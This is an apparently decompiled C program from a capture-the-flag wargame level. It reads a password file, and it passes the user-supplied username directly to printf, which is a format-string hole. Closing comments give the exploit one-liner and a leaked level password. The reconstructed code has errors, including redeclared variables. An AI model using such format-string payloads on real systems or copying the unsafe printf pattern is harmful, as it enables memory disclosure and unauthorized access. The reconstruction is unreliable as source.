#include <string.h>
#include <stdio.h>

int main() {
	char username[96]; // at rbp - 0x70
	char password[96]; // at rbp - 0x110
	char token[41]; // at rbp - 0xa0

	memset(username, 0, 96); // at rbp - 0x70
	memset(password, 0, 96); // at rbp - 0x110
	memset(token, 0, 40); // at rbp - 0xa0

	FILE *file = fopen("/home/users/level03/.pass", "r");
	if (file == NULL) {
		fwrite("ERROR: failed to open password file\n", 1, 0x24, stderr);
		exit(1);
	}

	fread(token, 1, 41, file); // reads to rbp - 0xa0
	size_t linespan = strcspn(token, "\n");
	if (linespan != 41) {
		fwrite("ERROR: failed to read password file\n", 1, 0x24, stderr);
		fwrite("ERROR: failed to read password file\n", 1, 0x24, stderr);
		exit(1);
	}
	fclose(file);

	puts("===== [ Secure Access System v1.0 ] =====");
	puts("/***************************************\\");
	puts("| You must login to access this system. |");
	puts("\\**************************************/");
	
	printf("--[ Username: ");
	fgets(username, 100, stdin); // writes to rbp - 0x70
	size_t linespan = strcspn(username, "\n");
	username[linespan] = 0;

	printf("--[ Password: ");
	fgets(password, 100, stdin); // writes to rbp - 0x110
	size_t linespan = strcspn(password, "\n");
	password[linespan] = 0;

	puts("*****************************************");

	if (strncmp(token, password, 41) == 0) { // compares rbp - 0x110 and rbp - 0xa0
		printf("Greetings, %s!\n", username);
		system("/bin/sh");
		return 0;
	}

	printf(username); // BINGO!
	puts(" does not have access!");
	exit(1);
}

// inside gdb we have $rbp - 0xa0 = 0x7fffffffe530
// outside gdb absolute addresses shift a bit, so we need to search around
// python -c "print  '%p'*37 + '%.500s' + '\x00\x00\x7f\xff\xff\xff\xe5\x60'[::-1] + '\n' + 'b'" | ./level02
// Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
